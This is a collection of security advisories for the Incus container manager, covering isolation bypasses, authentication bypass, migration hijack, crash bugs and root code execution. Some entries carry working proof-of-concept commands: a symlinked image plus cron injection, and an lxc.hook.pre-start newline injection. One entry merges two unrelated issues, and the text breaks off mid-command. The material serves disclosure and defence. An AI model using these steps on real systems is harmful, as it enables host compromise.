GHSA-9f75-5fjw-5jvv.description: ### Summary OVN ACL syslog events are broadcast with an empty project string. The event server only applies its project-binding filter and per-project permission checker to events that carry a non-empty project, so empty-project events skip both. As a result, any authenticated client with event-view access to a single project receives every project's OVN ACL verdict logs — source/destination IPs, ports, protocols and allow/drop decisions — defeating the project isolation the restricted-certificate model advertises. ### Details On a cluster member with `core.syslog_socket=true`, the syslog listener forwards OVN `acl_log` records to the event server with an empty project: ``` internal/server/syslog/listener.go:136 eventServer.Send('', api.EventTypeNetworkACL, event) ``` The broadcast routine skips both authorization checks whenever the event's project is empty: ``` internal/server/events/events.go:197 if event.Project != '' && !listener.allProjects && event.Project != listener.projectName { continue } internal/server/events/events.go:202 if event.Project != '' && !listener.projectPermissionFunc(auth.ObjectProject(event.Project)) { continue } ``` `network-acl` is not a privileged event type, so a restricted TLS or OIDC client can subscribe to it on any one project it can access: ``` cmd/incusd/events.go:25 eventTypes = []string{..., api.EventTypeNetworkACL} cmd/incusd/events.go:26 privilegedEventTypes = []string{api.EventTypeLogging} // network-acl absent ``` A project-restricted client issuing `GET /1.0/events?project=P&type=network-acl` therefore receives OVN ACL logs from **every** project, not just `P`. The owning project cannot be recovered at the syslog layer — the listener only has the raw OVN log text — so the events are inherently server-wide, like `logging` events, but were not gated like them. ### Proof of concept Verified against the unmodified production broadcast path (`go test`, real `AddListener`/`Send`/`broadcast`): a listener bound to project `default`, and an all-projects listener whose permission checker denies every project except `default`, both still received empty-project `network-acl` events. ``` $ go test ./internal/server/events/ -run TestProjectLeakAudit -v -count=1 === RUN TestProjectLeakAuditEmptyProjectNetworkACLEventsBypassRestrictions VULN-CONFIRMED [single-project listener bound to project=default]: received empty-project event: {'message':'ACL-DROP src=10.40.0.9 dst=10.10.0.5 proto=tcp',...} VULN-CONFIRMED [all-projects listener, permission checker denies all but project=default]: received 2 empty-project event(s) --- PASS: TestProjectLeakAuditEmptyProjectNetworkACLEventsBypassRestrictions (0.40s) ``` The two control cases in the same test confirm that properly project-tagged events are correctly filtered — only the empty-project path bypasses the checks. ### Impact A project-restricted client can observe other projects' OVN firewall verdict logs — internal IP pairs, ports, protocols, and allow/drop decisions — breaking the cross-project confidentiality the restricted-certificate model is meant to enforce. Exploitation requires an authenticated client with event-view access on at least one project, and a cluster member configured with `core.syslog_socket=true` receiving OVN ACL logs.

GHSA-f7xp-22ph-v444.title: Incus guest-API image export ignores the guest's project, exposing other projects' images
GHSA-f7xp-22ph-v444.description: ### Summary The `/dev/incus` guest-API image export handler forwards the guest-controllable `project` query parameter straight through to the image export logic, without pinning it to the guest instance's own project. For a guest request the permission check carries no auth context and falls through to the public branch, whose only gate is that the image is public or cached. A container root with the guest-API image entitlement can therefore export any public or cached image of any project it names — including cached non-public images originally pulled from authenticated remotes into other projects. ### Details The guest-API export handler forwards the request as-is: ``` cmd/incusd/dev_incus.go:99 devIncusImageExport handler cmd/incusd/dev_incus.go:109 r.RemoteAddr = '@dev_incus' cmd/incusd/dev_incus.go:111 imageExport(d, r) ``` `imageExport` reads the project from the guest-controllable query parameter, and for a `@dev_incus` request the only remaining gate is public-or-cached: ``` cmd/incusd/images.go:4469 projectName := request.ProjectParam(r) // from ?project= cmd/incusd/images.go:4505-4513 @dev_incus branch cmd/incusd/images.go:4511 if !imgInfo.Public && !imgInfo.Cached { return NotFound } ``` Because the guest controls `?project=` and the export never pins the project to the instance, any `Public || Cached` image in any project is reachable. ### Proof of concept Code-chain verified (not executed). A container with `security.guestapi.images=true` issues, over the `/dev/incus` socket: ``` GET /1.0/images/<fingerprint>/export?project=<other-project> ``` for a fingerprint of a cached image in another project, and receives the image contents. ### Impact A container root with the guest-API image entitlement can read image objects from projects other than its own, including cached non-public images pulled from authenticated remotes. This is a management-plane authorization-scope defect, not a container escape: the guest stays confined to its own filesystem and gains only read access to image objects the server already caches.

GHSA-h2j8-4crh-vhfc.title: Incus exposes migration websocket secrets to project event listeners, allowing migration hijack
GHSA-h2j8-4crh-vhfc.description: ### Summary Instance, volume and snapshot migration operations embed their per-connection websocket secrets in the operation metadata. That metadata is broadcast to every event listener holding view access on the operation's project, and is also returned by operation queries. Unlike exec and console, the migration websocket authorizes a connection on the secret alone, with no binding to the operation's requestor. A client with event-view access to the project can therefore read the secret and connect to an in-flight migration's data channels before the legitimate peer, hijacking the transfer of an instance it may not otherwise read. ### Details The migration source/sink renders its per-connection secrets into the operation metadata: ``` cmd/incusd/migrate.go:181 migrationSourceWs.Metadata() -> {control: <secret>, fs: <secret>} ``` That metadata is broadcast on the operation event stream to every listener with `can_view_events` on the project, while the operation is still `Pending`: ``` internal/server/operations/operations.go:537 rendered operation includes Metadata internal/server/operations/linux.go:63 sendEvent -> Send(projectName, EventTypeOperation, ...) ``` The migration websocket authorizes on the secret only — no requestor check, in contrast to exec and console: ``` cmd/incusd/migrate.go:190-211 migrationSourceWs.Connect(): matches r.FormValue('secret') only cmd/incusd/instance_exec.go:96 execWs.connect(): if !op.IsSameRequestor(r) { Forbidden } cmd/incusd/instance_console.go:94 consoleWs.connect(): if !op.IsSameRequestor(r) { Forbidden } ``` and the websocket endpoint itself is `AllowUntrusted`: ``` cmd/incusd/operations.go:54 operationWebsocketGet AllowUntrusted: true ``` A restricted certificate scoped to a project is granted every entitlement on that project, so it holds both `can_view_events` and `can_view_operations` — meaning the secret is reachable both through the event stream and through `GET /1.0/operations/{id}`. ### Proof of concept Runtime-verified on Incus 6.0.0 (single daemon, privileged container, attacker remote looped back over HTTPS — the CLI-mediated migration path that generates websocket secrets): ``` === operation event broadcast (sniffer view, secrets masked) === {'type':'operation','project':'default', 'metadata':{'class':'websocket','description':'Migrating instance','id':'2689233b-...', 'metadata':{'control':'bc553c24...','fs':'2ea16bec...'}, 'resources':{'instances':['/1.0/instances/c1']},'status':'Pending','status_code':105}} === attacker websocket connection times (natural race) === control: connected +0.012s after secret broadcast fs: connected +0.013s after secret broadcast === legitimate migration target, arriving second (incusd journal) === level=error msg='Failed migration on target' err='Failed getting migration target filesystem connection: websocket: bad handshake' instance=c2m === attacker receives migration-channel bytes === first data frame = 3715-byte migration index header JSON {'config':{'Container':{...full instance config, image fingerprint, volatile.*...}}} ``` Controls in the same lab: `incus restart` operations broadcast no secret-bearing events (0/3), and the same migration without the hijacker succeeds. Recorded limitations: the event subscriber used an admin-equivalent certificate (the `can_view_events`-only restricted path is code-chain); the demo was single-daemon; and the full rootfs transfer after the index header was not captured — the channel hijack, rejection of the legitimate consumer, and first payload bytes are the captured facts. ### Impact A client with event-view access to a project can capture the connection secrets of an in-flight migration and hijack its data websockets, winning a race measured at tens of milliseconds in the lab. The legitimate migration then fails server-side, and the attacker receives the migration channel — including the full instance configuration, image fingerprint and volatile keys in the index header, and the instance's filesystem stream that follows — for an instance it may not otherwise read.

GHSA-jcw9-v2ff-8m79.title: Restricted project users can create resources in the default project, bypassing project isolation (host root via dnsmasq, host file read via mkfs)
GHSA-jcw9-v2ff-8m79.description: ### Impact Incus authorizes resource-creation requests against the project named in the request, but creates the resource in the *effective* project. For a project without the relevant `features.*` flag, the effective project is `default` (for example `features.storage.volumes=false` or the default `features.networks=false`). A client certificate restricted to a single project, holding only a create entitlement on that project, can therefore create objects in `default`, which is unrestricted. Two of these paths reach code that runs as root and give full host compromise: - **Networks (host root).** A bridge network created in `default` carries `raw.dnsmasq`, which is written verbatim into the dnsmasq config and loaded via `--conf-file`; when it is set, the dnsmasq AppArmor profile is skipped. Injecting `leasefile-ro` with `dhcp-script=<path>` makes dnsmasq run the script as root at startup (`-u`/`-g` do not constrain the lease script, and no `--dhcp-scriptuser` is passed). No container or DHCP lease is required. - **Storage volumes (host file disclosure).** A custom volume created in `default` carries `block.create_options`; on block-backed pools this reaches `makeFSType` as `mkfs` arguments run as root. `block.create_options=-d /etc` on an ext4 volume copies the host's `/etc` into a tenant-mountable filesystem (`/etc/passwd`, `/etc/shadow`, ...); other arguments extend the primitive. This also bypasses the restricted-project `block.create_options` check (GHSA-4cph-ccqv-hm3c), because `default` is not restricted. The same authorization gap exists on the create paths for storage buckets, network zones, network ACLs and profiles. These do not reach a root-exec primitive, but still let a restricted tenant create objects in `default`, breaking project isolation. Creating a storage bucket this way also bypassed the project's `restricted.storage-pools.access`, letting the tenant place a bucket on a storage pool its project is not allowed to use. The image-creation path is not affected; it already re-authorizes the effective project. ### Workarounds Do not grant resource-creation entitlements (networks, storage volumes/buckets, network zones/ACLs, profiles) to restricted certificates or restricted-project users on servers where those projects have `features.*` disabled. Operators can audit `default` for objects created by tenant identities, in particular bridge networks carrying `raw.dnsmasq` and custom volumes carrying `block.create_options`.

GHSA-pf5w-m8m6-5265.title: Recursive and all-projects responses disclose other projects' bucket S3 keys and profile configuration to restricted clients (incomplete fix of GHSA-x8gj-2q73-qr6j)
GHSA-pf5w-m8m6-5265.description: ### Impact A restricted TLS client that can only *view* a storage bucket can read that bucket's S3 access key and secret key through the recursive bucket responses. The explicit key endpoints (`GET .../buckets/{bucket}/keys` and `GET .../buckets/{bucket}/keys/{key}`) were restricted to `can_edit` by the fix for GHSA-x8gj-2q73-qr6j. However, the bucket detail response with recursion and the bucket list response with `recursion=2` both embed the full key list, including `secret-key`, and did not apply that `can_edit` check. A client with only `can_view` on the bucket therefore obtained the credentials that the explicit routes deny. This is reachable in ordinary multi-tenancy: a certificate restricted to a project with `features.storage.buckets=false` inherits the `default` project's buckets, can view them, and so can read their S3 keys. The disclosed keys are credentials for the bucket's object storage. The same class of mistake affects the list endpoints that accept `all-projects=true`: the per-object access check was evaluated against the project named in the request rather than each object's own project. The TLS authorizer skips its project refusal for all-projects requests and relies on that per-object check, so it approved every object regardless of the project it belongs to. Two listings are affected: - `GET /1.0/storage-pools/{pool}/buckets?all-projects=true` returns the configuration of buckets in every project, and with `recursion=2` their S3 access and secret keys. - `GET /1.0/profiles?all-projects=true` returns the profiles of every project, and with `recursion=1` their full `config` and `devices`, including sensitive `environment.*`, `cloud-init.*` and `user.*` values. A restricted client — including one scoped to a project with no relationship to the target, or one with an empty project list — can therefore read this data across all projects. The profile listing needs no particular configuration and no knowledge of resource names. Nothing is written. ### Workarounds Do not grant view access on storage buckets (or on projects that inherit the default project's buckets) to clients that should not hold those buckets' S3 credentials; in particular review restricted certificates scoped to projects with `features.storage.buckets=false`. S3 keys for buckets that may have been exposed to such clients should be rotated. There is no effective workaround for the profile listing other than upgrading.

GHSA-x6pw-mh5w-pq73.title: Denial of service via a null snapshot entry in an instance backup
GHSA-x6pw-mh5w-pq73.description: ### Summary Importing an instance backup reads the list of snapshots from the backup's `index.yaml`, but does not verify that each entry is present. A backup whose snapshot list contains an explicit `null` entry is accepted, and that null entry is later dereferenced while the imported instance's configuration is rewritten. ### Impact Any client allowed to create instances in a project can submit a crafted instance backup that crashes the Incus daemon through a nil pointer dereference. The crash occurs in an operation goroutine with no recovery, so the entire daemon terminates, taking down every container and virtual machine on the node until it is restarted. The request is cheap and deterministic and can be repeated to keep the daemon in a crash loop. There is no confidentiality or integrity impact. ### Details A backup configuration stores its snapshots as a list of pointers. A YAML `null` sequence element deserializes to a nil pointer, and the import path that rewrites the stored configuration iterates this list and reads fields of each entry without a nil check. The top-level instance and volume objects are validated, but the individual snapshot entries are not, so an attacker-supplied null element reaches the dereference directly. ### Workarounds Only allow trusted clients to create and import instances.

GHSA-xg75-xf37-cph9.title: Authentication and authorization bypass through unverified client certificate chains
GHSA-xg75-xf37-cph9.description: ### Summary The HTTPS listener requests client certificates without verifying them, so the TLS handshake only proves that the client holds the private key of the first certificate in the chain it presents. The remaining certificates are entirely client controlled. The authentication and certificate ownership checks compared every certificate in the presented chain against the trust store. A client could therefore authenticate as any trusted certificate by appending that certificate's public part to its own chain, without holding the matching private key. This has been the case since the initial release. ### Impact Any client able to reach the HTTPS listener can authenticate as any trusted client, metrics or server certificate for which it has the public certificate, including as a cluster member, which bypasses authorization entirely. Server certificates are returned by every TLS handshake, so no prior access is needed to obtain one. Appending the server's own certificate grants access to the database gateway, and on a cluster appending another member's certificate grants internal cluster access. Client certificates can be read by any trusted client through the certificates API or obtained from any server the client connected to. The same flaw lets a client renew or delete any trust store entry through the self-service paths, and affects the authentication of the agent connection between the host and virtual machines. The unverified presented chain was also passed to the authorization scriptlet, so a client could feed it attacker-chosen certificates to influence scriptlet-based authorization decisions. This includes clients not authenticated through mutual TLS, such as token or OIDC clients, which can still present an arbitrary certificate during the handshake. ### Workarounds Restrict network access to the HTTPS listener to trusted hosts. There is no configuration based workaround.

CVE-2026-33711.title: Incus is a system container and virtual machine manager. Incus pr ...
CVE-2026-33711.description: Incus is a system container and virtual machine manager. Incus provides an API to retrieve VM screenshots. That API relies on the use of a temporary file for QEMU to write the screenshot to which is then picked up and sent to the user prior to deletion. As versions prior to 6.23.0 use predictable paths under /tmp for this, an attacker with local access to the system can abuse this mechanism by creating their own symlinks ahead of time. Version 6.23.0 fixes the issue.

CVE-2026-33897.title: Incus is a system container and virtual machine manager. Prior to ...
CVE-2026-33897.description: Incus is a system container and virtual machine manager. This particular implementation of pongo2 within Incus allowed for file read/write but with the expectation that the pongo2 chroot feature would isolate all such access to the instance's filesystem. This was allowed such that a template could theoretically read a file and then generate a new version of said file. Unfortunately the chroot isolation mechanism is entirely skipped by pongo2 leading to easy access to the entire system's filesystem with root privileges. Version 6.23.0 patches the issue.

CVE-2026-33945.title: Incus is a system container and virtual machine manager. Incus in ...
CVE-2026-33945.description: Incus is a system container and virtual machine manager. Incus instances have an option to provide credentials to systemd in the guest. While it's not possible to read any data this way, it's possible to write to arbitrary files as root, enabling both privilege escalation and denial of service attacks. Version 6.23.0 fixes the issue.

CVE-2026-35527.title: Incus is an open source container and virtual machine manager. In ...
CVE-2026-35527.description:
Incus is an open source container and virtual machine manager. In versions prior to 7.0.0, the image import flow issues an outbound HEAD request to a user-supplied URL before validating the request against project restrictions such as restricted.images.servers. The imgPostURLInfo function constructs and sends a HEAD request directly from the attacker-supplied source URL to resolve image metadata, and this network interaction occurs before the flow reaches the point where the import would be rejected by policy. Although the actual image download is blocked by the project restriction, an authenticated user can coerce the daemon into making blind HEAD requests to arbitrary destinations.

These requests include server metadata in custom headers (Incus-Server-Architectures, Incus-Server-Version), which discloses information about the host environment to the attacker-controlled endpoint. This blind SSRF primitive can be used to probe internal services, unroutable address space, or cloud metadata endpoints reachable from the host.

This vulnerability pattern is similar to CVE-2026-24767. This issue has been fixed in version 7.0.0.

The vulnerability is present in the backup metadata handling logic, where the daemon processes the index.yaml file from an imported archive and accesses members of the parsed backup configuration without first verifying that the configuration object was initialized. A malicious or malformed index.yaml that omits the config block causes a nil-pointer dereference during bucket import operations and terminates the daemon. Repeated use of this issue can be used to keep Incus offline, causing a denial of service. This issue is fixed in version 7.0.0.

CVE-2026-40197.description: Incus is a system container and virtual machine manager. In versions before 7.0.0, missing validation logic in the storage volume import logic allows an authenticated user with access to the storage volume feature to cause the Incus daemon to crash. The custom volume backup import subsystem contains a nil-pointer dereference vulnerability during import operations. In the snapshot import loop, the daemon iterates over entries from `srcBackup.Config.VolumeSnapshots` and assumes that each slice element is initialized, then dereferences fields such as `Name`, `Config`, `Description`, `CreatedAt`, and `ExpiresAt` without first validating the element itself. Because the yaml unmarshaler accepts explicit null array elements from an attacker-controlled index.yaml and converts them into nil pointers inside the slice, an attacker can supply a backup archive containing a null entry in the volume_snapshots array. This causes a nil-pointer dereference during custom volume import and terminates the daemon, resulting in denial of service on the affected node. Repeated use of this issue can be used to keep Incus offline, causing a denial of service. This issue is fixed in version 7.0.0.

CVE-2026-40243.description:
Incus is a system container and virtual machine manager. In versions before 7.0.0, broken TLS validation logic in the OVN database connection logic can allow connections to an attacker's OVN database. The OVN client implementations disable Go standard TLS server verification and replace it with custom peer-certificate verification logic. That replacement verifier does not anchor trust in the configured CA certificate. Instead, it constructs the verification root set from certificates supplied by the peer during the handshake, so the configured CA is parsed but not used as the trust anchor for the final verification decision.

In OVN-enabled deployments that use these SSL database connection paths, an attacker able to impersonate or intercept the OVN endpoint on the management network can present a rogue self-signed certificate chain, and Incus will accept this certificate as valid. This issue defeats the intended CA-based trust model for OVN database connections and permits endpoint impersonation by an active attacker in a suitable network position. This issue is fixed in version 7.0.0.

CVE-2026-40251.description:
Incus is a system container and virtual machine manager. In versions before 7.0.0, missing validation logic in the storage volume import logic allows an authenticated user with access to the storage volume feature to cause the Incus daemon to crash. The backup restore subsystem contains an out-of-bounds panic vulnerability caused by an invalid bounds check when indexing snapshot metadata arrays, and the same flawed pattern also appears in the migration path. When iterating through physical snapshots provided in a backup archive, the loop uses the index to look up corresponding metadata in the parsed `Config.Snapshots` and `Config.VolumeSnapshots` slices. The guard condition `len(slice) >= i-1` is incorrect because it can still evaluate to true when the subsequent slice[i] access is out of bounds.

An attacker can submit a backup archive that contains physical snapshot directories while supplying a tampered `index.yaml` with an empty or truncated snapshot metadata array, causing the daemon to index beyond the end of the metadata slice and crash. Repeated use of this issue can be used to keep Incus offline, causing a denial of service. This issue is fixed in version 7.0.0.

CVE-2026-81494.title: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection
CVE-2026-81494.description:
## Summary Incus extracts a unified image's top-level files straight into the instance directory, and later writes to two of those paths as root without checking for symlinks: `backup.yaml` (at instance create) and `network/resolv.conf` (at OCI container start). An imported image can ship those names as absolute symlinks pointing anywhere on the host. When the instance is created and started, `incusd` follows them and writes root-owned files outside the instance directory. Because `oci.dns.domain` and `oci.dns.search` accept newlines, the content written to `resolv.conf` is attacker-controlled. Pointing that symlink at `/etc/cron.d/` turns the write into root command execution. This is reachable by importing a crafted image (`incus image import`), not by pulling one from an OCI/Docker registry - the registry path rebuilds the metadata tarball from only `config.json` and `metadata.yaml`, so it can't carry these entries. ## Who can do this The relevant boundary is the project-scoped (restricted) certificate, which Incus treats as an 'operator (`internal/server/auth/driver_tls.go:83-94`, role assigned at `:242`). Such a user has full rights inside their own project - including importing images and creating/starting instances - but is not a server admin and is confined to their project. This bug lets that operator write files as root on the host, escaping the project. It does not add any privilege in the default single-admin setup (local socket, one unrestricted cert), where an image importer is already root-equivalent. The `PR:L` score assumes the restricted/multi-tenant model. ## Root cause 1. Image top-level content is unpacked into the instance directory and never sanitized. `getImageMetadata()` (`cmd/incusd/images.go`) only checks that `metadata.yaml` and a `rootfs/` entry exist; it doesn't reject extra entries like `network/` or `backup.yaml`. `ImageUnpack()` (`internal/server/storage/utils.go`) only `Lstat`s `rootfs` for a symlink. On the dir backend the whole tarball goes straight into the instance volume. 2. Two root writes under the instance dir use plain `os.WriteFile`/`os.Create`, which follow symlinks. The sibling `templates` and `credentials` writes in the same driver were already moved to `os.OpenRoot`; these two were not. | Path | Location (7.2.0 → main) | Written at | Instance types | |---|---|---|---| | `network/resolv.conf` | `driver_lxc.go:2635` → `:2644` | OCI start | OCI containers | | `backup.yaml` | `backend.go:6967` → `:7042` | instance create | all containers + VMs | 3. `oci.dns.domain` / `oci.dns.search` use `validate.IsAny` (`internal/instance/config.go:816/825`, `:830/839` on main), so newlines pass. `resolv.conf` is built with `fmt.Fprintf(&resolvConf, 'domain %s
', value)`, so a newline in the value adds a second, fully controlled line. `backup.yaml` is the broader of the two: it needs no `config.json` or `oci.*` config, fires on create for every instance type, and isn't fixed by hardening only the `network/` writes. ## Call path Create → `instanceCreateFromImage()` (`instance.go:137`) → `CreateInstanceFromImage()` (`backend.go:1824`) unpacks the image into the instance dir (planting the symlinks), then `UpdateBackupFile()` (`instance.go:273`) → `os.Create(inst.Path()/backup.yaml)` (`backend.go:7042`) follows the symlink. Start → config generation checks `PathExists(d.Path()/config.json)` (`driver_lxc.go:2426`), then `os.WriteFile(d.Path()/network/resolv.conf, …)` (`:2644`) follows the symlink. ## What I tested Incus 7.2 (client and server), dir storage backend, `incus admin init --minimal`, Ubuntu 24.04. One crafted image with both symlinks. - `incus init` wrote the `backup.yaml` symlink target as `root:root`, mode 0400, outside the instance dir, containing the instance's backup YAML. No start needed. - `incus start` wrote the `resolv.conf` symlink target as `root:root`, mode 0644. The nested container start then failed under Docker (`forklxc`), but the write happens during config generation before that, so it lands regardless. On a full VM the start also completes. - Root command execution via `/etc/cron.d`: this needs one detail. A value like `x
* * * * * root <cmd>` writes `domain x` as the first line, which cron 3.0pl1 (Debian/Ubuntu) treats as a syntax error and drops the whole file - nothing runs. Prefixing the value with `=` (so the line becomes `domain =x`) makes cron read it as an environment assignment (`domain=x`), the file is accepted, and the next line runs. With that, cron executed the injected command as root; the proof file contained `uid=0(root) gid=0(root) groups=0(root)`. The arbitrary root write itself needs no cron and no other component. Code execution needs a host-side consumer of the file - cron is the one I demonstrated (present by default on most server distros), and needs the `=` trick above. Other consumers (`~root/.ssh/authorized_keys`, `/etc/ld.so.preload`) have their own preconditions. ## Reproduction Tested on a disposable host with Incus 7.2.0 and a dir storage pool (`incus admin init --minimal`). Everything below runs as an ordinary Incus user against their own project; the files that get written are owned by root. ### 1. Build the crafted image The same image carries both symlinks. `backup.yaml` is aimed at a harmless `/tmp` marker (proves the write); `network/resolv.conf` is aimed at `/etc/cron.d` (proves code execution). Point both at `/tmp` if you only want the write proof. ```bash mkdir -p img/rootfs img/network cat > img/metadata.yaml <<'EOF' architecture: x86_64 creation_date: 1 properties: type: oci EOF # minimal but valid OCI runtime spec; process.args is dereferenced before the resolv.conf write printf '{'ociVersion':'1.0.2','process':{'user':{'uid':0,'gid':0},'args':['/bin/sh'],'cwd':'/'},'root':{'path':'rootfs'}}' > img/config.json ln -s /tmp/incus-write-proof img/backup.yaml # write target (create) ln -s /etc/cron.d/incus-rce img/network/resolv.conf # RCE target (start) tar --owner=0 --group=0 --numeric-owner -C img -cf image.tar \ metadata.yaml rootfs config.json network backup.yaml tar -tf image.tar # confirms the two entries are symlinks ``` ### 2. Arbitrary root write - `backup.yaml`, fires at create ```bash incus image import image.tar --alias evil incus init evil victim stat -c '%n %U:%G %a' /tmp/incus-write-proof ``` Expected: the file exists outside any instance directory, owned by root: ``` /tmp/incus-write-proof root:root 400 ``` `/tmp/incus-write-proof` now holds the instance's backup YAML - proof that `os.Create(inst.Path()/backup.yaml)` followed the symlink. This alone is the arbitrary-write primitive and needs no container start. ### 3. Root command execution - `resolv.conf` into `/etc/cron.d` The injected value must start with `=` so the first line becomes `domain =x`, which cron reads as an environment assignment; without it, the leading `domain x` line is a cron syntax error and Debian/Ubuntu cron drops the whole file. ```bash incus config set victim oci.dns.domain '$(printf '=x
* * * * * root id > /tmp/rce 2>&1')' incus start victim # writes /etc/cron.d/incus-rce via the symlink (start itself may error afterwards) cat /etc/cron.d/incus-rce ``` Expected file (root:root, 0644): ``` domain =x * * * * * root id > /tmp/rce 2>&1 ``` Within a minute cron runs it as root: ```bash sleep 65; cat /tmp/rce # uid=0(root) gid=0(root) groups=0(root) ``` ### Cleanup ```bash incus delete -f victim; incus image delete evil rm -f /tmp/incus-write-proof /tmp/rce /etc/cron.d/incus-rce ``` ## Impact Arbitrary create/truncate of any root-writable file on the host (I:H/A:H): truncate `/etc/shadow`, overwrite a systemd unit, corrupt `incusd` state. Root command execution (C:H/I:H/A:H) when the write lands in a file a root process reads, as shown with cron. The write is in the host mount namespace and isn't limited by the container's user namespace or privilege level. ## Fix 1. Do the writes under the instance dir through `os.OpenRoot` (already used for templates and credentials): `backup.yaml`, `network/resolv.conf`, `network/hosts`, `network/hostname`, `network/dhcp.skip`. 2. After unpack, reject or remove daemon-owned top-level entries (`network/`, `backup.yaml`, `config.json`, `credentials/`, `state/`, …) instead of trusting the image; extend the existing `rootfs` symlink check to them. 3. Reject ``/`
` in `oci.dns.domain` and each `oci.dns.search` element.

CVE-2026-81498.description:
## Summary ### Impact The `nvidia.driver.capabilities` instance configuration key in Incus uses `validate.IsAny` at `internal/instance/config.go:744`, which accepts any input without filtering. The value is subsequently written to the generated `lxc.conf` file at `internal/server/instance/drivers/driver_lxc.go:1104` via `fmt.Sprintf` with zero escaping. An authenticated attacker with permission to set instance configuration can inject a newline character (`
`) into the value, causing a line break in `lxc.conf` and injecting arbitrary LXC configuration directives — including `lxc.hook.pre-start` — which execute as **root on the host** when the container starts. This is an **independent bypass of CVE-2026-23953**. The CVE-2026-23953 fix added `
` filtering for `environment.*` config keys at `config.go:1621`, but `nvidia.driver.capabilities` uses a separate validator (`validate.IsAny`) that was never audited or fixed. The injection mechanism is identical to CVE-2026-23953 — the only difference is the entry config key. ### Patches No official patch is available. Apply the Workarounds below. ### Workarounds 1. **Do not grant instance configuration privileges to untrusted users.** This is the most effective immediate mitigation. 2. **Apply the code patch** below to `internal/instance/config.go`: ```diff - 'nvidia.driver.capabilities': validate.IsAny, + 'nvidia.driver.capabilities': validate.IsNvidiaConfigValue, ``` 3. **Additionally audit** `nvidia.require.cuda` and `nvidia.require.driver` (lines 753, 762) — they also use `validate.IsAny` but have a missing `else` clause in `driver_lxc.go` that currently prevents exploitation. Fix both the validator AND the missing else clause. ## Attack Path (Validation Evidence) ``` [Entry Point] POST /1.0/instances or PUT/PATCH /1.0/instances/{name} or incus config set <instance> nvidia.driver.capabilities <value> ↓ User-supplied value, e.g.: 'all
lxc.hook.pre-start = /bin/sh -c 'id > /tmp/pwn'' [Validator] ConfigKeyChecker('nvidia.driver.capabilities') (config.go:744) → returns validate.IsAny (shared/validate/validate.go:188) → func IsAny(_ string) error { return nil } ✗ ZERO validation —

, , or any special characters [Sink] lxcSetConfigItem('lxc.environment', '<value containing 
>') → c.SetConfigItem → cc.SaveConfigFile → lxc.conf on disk ``` **Sanitization Verdict: ABSENT** — No filtering, validation, or escaping exists at any layer between user input and lxc.conf file write. ## Proof of Concept ### CLI (based on confirmed CLI usage from Phase A) ```bash # 1. Create a test container (no GPU hardware required) incus launch images:alpine/edge test-injection # 2. Inject 
 + LXC hook via nvidia.driver.capabilities # The $'...' bash syntax embeds a literal 
 byte incus config set test-injection nvidia.driver.capabilities \ $'all
